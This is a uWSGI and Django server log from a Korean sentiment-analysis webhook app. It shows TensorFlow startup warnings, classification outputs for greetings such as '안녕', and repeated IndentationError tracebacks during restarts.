2020-08-28 12:35:18.145458: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
파일열기시작
파일열기끝
2020-08-28 12:35:25.146940: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 12:35:25.146969: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 12:35:25.146986: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 12:35:25.147199: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 12:35:25.171026: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 12:35:25.171402: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x56157ecda490 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 12:35:25.171422: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 12:35:25.458711: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:35:25.460301: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:35:25.461674: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['안녕']
['안녕']
[[4352]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4352]]
2020-08-28 12:35:29.734225: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-08-28 12:35:30.038468: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:35:30.040252: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:35:30.041650: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
85.09% 확률로 부정 리뷰입니다.

[pid: 2201|app: 0|req: 1/1] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:35:17 2020] POST /webhook/ => generated 38 bytes in 12460 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['안녕']
['안녕']
[[4352]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4352]]
85.09% 확률로 부정 리뷰입니다.

[pid: 2201|app: 0|req: 2/2] 66.249.84.11 () {42 vars in 540 bytes} [Fri Aug 28 12:35:37 2020] POST /webhook/ => generated 38 bytes in 54 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:36:58 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55a47d65acf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55a47d65acf0 pid: 2294 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2294, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 46
    return welcome(queryText)
    ^
IndentationError: unexpected indent
[pid: 2294|app: 0|req: 1/1] 66.249.84.11 () {42 vars in 540 bytes} [Fri Aug 28 12:37:03 2020] POST /webhook/ => generated 101918 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 46
    return welcome(queryText)
    ^
IndentationError: unexpected indent
[pid: 2294|app: 0|req: 2/2] 66.249.84.13 () {42 vars in 540 bytes} [Fri Aug 28 12:41:14 2020] POST /webhook/ => generated 101918 bytes in 63 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:41:28 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x564865dc7cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x564865dc7cf0 pid: 2303 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2303, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 46
    return welcome(queryText)
    ^
IndentationError: unexpected indent
[pid: 2303|app: 0|req: 1/1] 66.249.84.11 () {42 vars in 540 bytes} [Fri Aug 28 12:42:17 2020] POST /webhook/ => generated 101918 bytes in 70 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:43:21 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5600c9548cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5600c9548cf0 pid: 2316 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2316, cores: 1)
2020-08-28 12:43:35.208809: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 12:43:35.208842: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
파일열기시작
파일열기끝
2020-08-28 12:43:41.658028: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 12:43:41.658060: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 12:43:41.658078: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 12:43:41.658289: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 12:43:41.683037: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 12:43:41.683378: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5600ce7089e0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 12:43:41.683394: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 12:43:41.970772: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:43:41.972212: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:43:41.973571: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['안녕']
['안녕']
[[4352]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4352]]
2020-08-28 12:43:46.261628: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-08-28 12:43:46.570672: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:43:46.572300: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:43:46.573718: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
85.09% 확률로 부정 리뷰입니다.

[pid: 2316|app: 0|req: 1/1] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:43:34 2020] POST /webhook/ => generated 38 bytes in 11933 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['안녕']
['안녕']
[[4352]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4352]]
85.09% 확률로 부정 리뷰입니다.

[pid: 2316|app: 0|req: 2/2] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:43:56 2020] POST /webhook/ => generated 38 bytes in 46 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['안녕하다']
['안녕하다']
[[4959]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4959]]
80.25% 확률로 부정 리뷰입니다.

[pid: 2316|app: 0|req: 3/3] 66.249.84.11 () {42 vars in 540 bytes} [Fri Aug 28 12:44:13 2020] POST /webhook/ => generated 38 bytes in 1379 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
